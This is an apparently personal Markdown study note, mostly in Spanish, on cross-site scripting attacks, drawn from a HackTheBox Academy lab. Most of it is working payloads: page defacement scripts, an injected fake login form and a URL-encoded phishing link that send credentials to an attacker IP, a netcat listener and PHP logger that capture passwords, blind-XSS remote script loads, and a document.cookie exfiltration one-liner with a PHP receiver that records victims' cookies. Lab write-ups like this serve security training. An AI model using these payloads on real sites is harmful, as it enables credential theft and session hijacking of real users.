# XSS Attack


## Defacement 


- Change background

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

- Chante page title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

- Change page text

```javascript
document.getElementById("todo").innerHTML = "New Text"
document.getElementsByTagName('body')[0].innerHTML = "New Text"

```

```javascript
$("#todo").html('New Text');
```

- Insert html code ->

Original html

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```
Mimified version inserted

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```
- [Html mimifier ](https://www.willpeavy.com/tools/minifier/)

## Inject Login Form (phishing)

- html a inyectar
  
```html
<h3>Please login to continue</h3>
<form action=http://10.10.15.96>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

- payload 
  
```javasctipt
'><script>alert(1)</script>
```

- payload que muestra el formulario y elimina el formulario anterior.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.96><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.96><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

- el listener de necatat que recibe las credenciasles

```bash
nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.15.96 34700
GET /?username=admn&password=pass&submit=Login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
...
...
```

## Grabar credenciales obtenidas

- Código php para grabar las credenciales obtenidas

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

- Montamos el servidor php para recibir

```bash
hackadvisermx@htb[/htb]$ mkdir /tmp/tmpserver
hackadvisermx@htb[/htb]$ cd /tmp/tmpserver
hackadvisermx@htb[/htb]$ vi index.php #at this step we wrote our index.php file
hackadvisermx@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

- Recibimos credenciales y estas se almacenan

```bash
cat creds.txt 
Username: chido | Password: maschdo
Username: paka | Password: paco
```

- Luego podemos enviar phising con la liga

```
http://10.129.102.212/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.96%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E
```

## Ahora robar cookies blind XSS

En algunos casos no podemos saber como se ejecuta, solo pidiento interar con nuestro remoto

```
<script src="http://10.10.15.96/username"></script>

'><script src=http://10.10.15.96></script>

"><script src=http://10.10.15.96></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.96\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "10.10.15.96");a.send();</script>

<script>$.getScript("http://10.10.15.96")</script>
```

- identificamos el campo que acepta la inyección y el payload adecuado

```
profle picuture with:
"><script src=http://10.10.15.96/script.js></script>
```

- Creamos un javascript local script.js

``` 
new Image().src='http://10.10.15.96/index.php?c='+document.cookie
```


```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```